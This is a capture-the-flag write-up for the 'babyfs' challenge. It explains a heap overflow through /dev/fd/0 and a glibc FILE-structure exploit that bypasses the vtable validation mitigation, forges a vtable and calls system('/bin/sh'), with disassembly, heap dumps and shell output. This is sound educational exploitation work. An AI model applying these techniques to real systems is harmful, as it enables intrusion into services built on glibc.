babyfs - Pwn 315 (13 Teams Solved)
-------------
### Description
Baby or not baby is up to you.<br>
nc 52.198.183.186 50216<br>
(link to binary and libc)

### Overview
babyfs is a x86-64 ELF(NX, SSP, PIE, Full RELRO) binary implementing a simple file stream open/read/write/close functions.<br>

It's a CTF-style menu challenge, easy to reversing, hard to exploit.

### Reversing
Okay, so lets check out how each functions are working.

#### Open

First we have to know how program manage each file stream and its data.<br>
In binary, it uses structure 1 to manage file stream and it allocated in .bss section (its global variable!).<br>
And sadly, there is PIE in binary so we cant use this metadata in exploit without PIE leak XD<br>

```c
// Structure 1
struct __attribute__((aligned(8))) simpleFs
{
  char *streamPtr;
  char *fileData;
  char fileName[64];
  unsigned __int64 fileLen;
  __int32 isWrite;
  __int32 padding;
};
```

We can open maximum 3 files at the same time in open menu. Function get file name at .bss section (global variable structure)and try to open file.<br>
If file name invalid, function opens error log file and write file name which we try to open.<br>
After open the file successfully get file length using fseek() and allocate data buffer (size fileLen+1) for read file.

#### Read
-- In read menu, program take index we opened from user.<br>
-- If index is invalid then get size to read. After comparing size with filesize call fread() to read data from file.<br>
-- Data is stored at **char \*fileData**.

#### Write
Take index and progress validation check same as read menu.<br>
We can write file data only one time because it sets write flag when write menu called.<br>
Menu returns "It have been writed !" strings if structure's isWrite flag != 0. If isWrite flag unsetted, function writes only one byte of file data to stdout stream.

#### Close
If index and streamPtr is not NULL, it frees **char \*fileData** and nullify other region without **char \*streamPtr**.<br>
**char \*streamPtr** nullified after fclose(streamPtr) called.

### Vulnerability

So where does the vulnerability occurs? It occurs at open menu.<br>
The size will return -1 and stored at **fileLen** if we give "/dev/fd/0" or "/dev/stdin" for file name, but buffer allocates size+1 so it will normally allocate heap buffer by malloc(0).<br>
**unsigned __int64 fileLen** is **unsigned int**, so heap overflow will occur if we give size bigger than 0x20 in read menu.

### Exploit - Intended

We always have to think what data can we overwrite.<br>
The most intuitive attack vector is the contents of the \_IO_FILE structure, which allocated in the heap directly.<br>
We looked at the \_IO_FILE structure and thought its enough to get arbitrary read/write by manipulating \_IO_read_ptr and \_IO_write_ptr to our input.

```c
struct _IO_FILE {
  int _flags;           /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

So, the scenario looks very simple.<br>
- Allocate 2 file streams. (/dev/fd/0, anything else)  
- Overwrite second file stream's \_IO_read_ptr and call file 1's write menu. (NULL byte appended to the end because it use fread, need brute-force for 0.5 byte.)
- Close file 1, allocate file 1 and repeat it to get full address of heap and libc. (can read 1byte per attempt)
- Close file 1 and allocate /dev/fd/0 again.
- Overwrite /dev/fd/0's \_IO_write_ptr to \_\_free_hook and call file 1's read menu.
- Overwrite \_\_free_hook to system or one-shot gadget, get shell!

Simple, huh?

### Exploit - Two little problems (crazy parts)
I tried to exploit using the above method, but there were some serious problems.

First, the binary was running with socat, some character was truncated.<br>
In particular **"\x7f"** is treated as a backspace, so I can't input the address of the library area.<br><br>
(Intended solution is bypass check with "\x16\x7f" and follow the above scenario.<br>
I want to suggest another solution that purely not using "\x7f".)

Therefore, we can't overwrite the library address in the location we want.<br>
However, that you can not use "\x7f" does not necessarily mean you can't enter the address of the library area into memory.<br>
We can enter library address by overwriting the lower bytes of the pointer that already points to the library area!<br>
We can overwrite the file stream with a fake vtable in heap so we can call the code we want.<br>

Yes, and I get local shell!

I was excited to get the flag and run the script after change the offset, but there was an error message.

> Fatal error: glibc detected an invalid stdio handle

So there is second problem, there was a new mitigation applied in latest version of libc. (after 2.24)<br>
It check the address of vtable before all virtual function call and if vtable invalid, just aborted.<br>
How can I exploit this binary?<br>

### Exploit - Final

So I thought calling other function that satisfy the condition.<br>
I found one function that does not check condition at 0x3bdbd0 while finding the useful vtable function.

> \_\_libc_IO_vtables:00000000003BDBD0                 dq offset sub_748E0

```c
// sub_748E0 vtable function
int __fastcall sub_748E0(__int64 arg)
{
  __int64 argPtr; // rax@1

  argPtr = *(arg + 0xA0);
  if ( *(argPtr + 0x30) && !(*(arg + 0x74) & 8) )
  {
    (*(arg + 0xE8))();
    argPtr = *(arg + 160);
  }
  *(argPtr + 48) = 0LL;
  return IO_wdefault_finish(arg, 0LL);
}
```

And this is the assembly code that calls the vtable function.

```asm
   0x7f36269526b3 <_IO_flush_all_lockp+355>:	mov    rax,QWORD PTR [rbx+0xa0]
=> 0x7f36269526ba <_IO_flush_all_lockp+362>:	mov    rcx,QWORD PTR [rax+0x18]
   0x7f36269526be <_IO_flush_all_lockp+366>:	cmp    QWORD PTR [rax+0x20],rcx
   0x7f36269526c2 <_IO_flush_all_lockp+370>:	jbe    0x7f36269526f7 <_IO_flush_all_lockp+423> # mitigation routine
   0x7f36269526c4 <_IO_flush_all_lockp+372>:	mov    rax,QWORD PTR [rbx+0xd8]
   0x7f36269526cb <_IO_flush_all_lockp+379>:	
    lea    rsi,[rip+0x33f1ee]        # 0x7f3626c918c0 <_IO_helper_jumps>
   0x7f36269526d2 <_IO_flush_all_lockp+386>:	mov    rdx,rax
   0x7f36269526d5 <_IO_flush_all_lockp+389>:	sub    rdx,rsi
   0x7f36269526d8 <_IO_flush_all_lockp+392>:	cmp    r12,rdx
   0x7f36269526db <_IO_flush_all_lockp+395>:	jbe    0x7f3626952850 <_IO_flush_all_lockp+768>
   0x7f36269526e1 <_IO_flush_all_lockp+401>:	mov    esi,0xffffffff
   0x7f36269526e6 <_IO_flush_all_lockp+406>:	mov    rdi,rbx
   0x7f36269526e9 <_IO_flush_all_lockp+409>:	call   QWORD PTR [rax+0x18] # call part
```

Register "rbx" stores a pointer of our fake input.<br>
We can call \*(\*(addr+0xd8)+0x18) but \*(addr+0xd8) must be code in the library vtable area.<br>

So I modify \*(addr+0xd8) to (libc + 0x3bdbd0 - 0x18), _\_IO_flush_all_lockp+409_ will call _sub_748E0_ function.<br>
In _sub_748E0_, check some conditions and call \*(addr+0xe8) without any checks.<br>

Yes, so if the pointers in both library areas are in the heap and their addresses differ by 0x10, we can modify first pointer to (libc+0x3bdbd0-0x18) and second pointer to system by arbitrary overwrite explained as above, we will get the shell.<br>

However there are no library pointers that condition satifies.<br>
But we can create library pointers by making unsorted bin.<br>
When we opens new file, it allocates two chunks in heap and binary allocates data chunk.<br>
First chunk is the file stream chunk, second is the file data chunk.<br>
However, we should be note that there is another library pointer at the end of the file stream chunk.<br>

```
0x555555758000:	0x0000000000000000	0x0000000000000231
0x555555758010:	0x00000000fbad2688	0x0000555555758240
0x555555758020:	0x0000555555758240	0x0000555555758240
0x555555758030:	0x0000555555758240	0x0000555555758240
0x555555758040:	0x0000555555758240	0x0000555555758240
0x555555758050:	0x0000555555758640	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000000000
0x555555758070:	0x0000000000000000	0x00007ffff7dd2540
0x555555758080:	0x0000000000000003	0x0000000000000000
0x555555758090:	0x0000000000000000	0x00005555557580f0
0x5555557580a0:	0xffffffffffffffff	0x0000000000000000
0x5555557580b0:	0x0000555555758100	0x0000000000000000
0x5555557580c0:	0x0000000000000000	0x0000000000000000
0x5555557580d0:	0x0000000000000000	0x0000000000000000
0x5555557580e0:	0x0000000000000000	0x00007ffff7dd06e0

...

0x5555557581e0:	0x0000000000000000	0x0000000000000000
0x5555557581f0:	0x0000000000000000	0x0000000000000000
0x555555758200:	0x0000000000000000	0x0000000000000000
0x555555758210:	0x0000000000000000	0x0000000000000000
0x555555758220:	0x0000000000000000	0x0000000000000000
0x555555758230:	0x00007ffff7dd0260	0x0000000000000411
0x555555758240:	0x0000000000000000	0x0000000000000000
```

So, If we free second chunk and unsorted bin's fd, bk(library pointer) are written in next heap+0x240 address, there are two pointers that satisfies the condition.<br>

```
0x5555557581e0:	0x0000000000000000	0x0000000000000000
0x5555557581f0:	0x0000000000000000	0x0000000000000000
0x555555758200:	0x0000000000000000	0x0000000000000000
0x555555758210:	0x0000000000000000	0x0000000000000000
0x555555758220:	0x0000000000000000	0x0000000000000000
0x555555758230:	0x00007ffff7dd0260	0x0000000000000411
0x555555758240:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
```

Great! So call vtable after modify +0x230 pointer to vtable address-0x18, +0x240 pointer to system then we can get shell!

The final exploit scenario:
>- Allocate 3 file streams
>- Get heap and libc address by above method (set _\_IO_read_end_ to avoid null byte at the end) 
>- Free file 0, make 2 library pointer differs 0x10.
>- Make fake table at before first library pointer and change first library pointer to &func-0x18
>- Overwrite second library pointer to system
>- Close chunk 2, call system("/bin/sh")!

> Closing /dev/fd/0 ...<br>
> /bin/sh: 0: can't access tty; job control turned off<br>
> $ id<br>
> uid=2139990319 gid=1337 groups=1337<br>
> $ cd /home/babyfs<br>
> $ ls<br>
> b4by_fl49  babyfs.bin  flag<br>
> $ <br>
> $ cat b4by_fl49<br>
> hitcon{pl4y_w1th_f1l3_Struc7ure_1s_fUn}<br>
> $  <br>

It was great challenge!<br>
I took almost 30 hours to solve it :(<br>
I learned really lot while thinking idea about bypassing vtable mitigation, thanks for angelboy XD (intended solution is very easy)<br>

Full exploit code is at babyfs.py
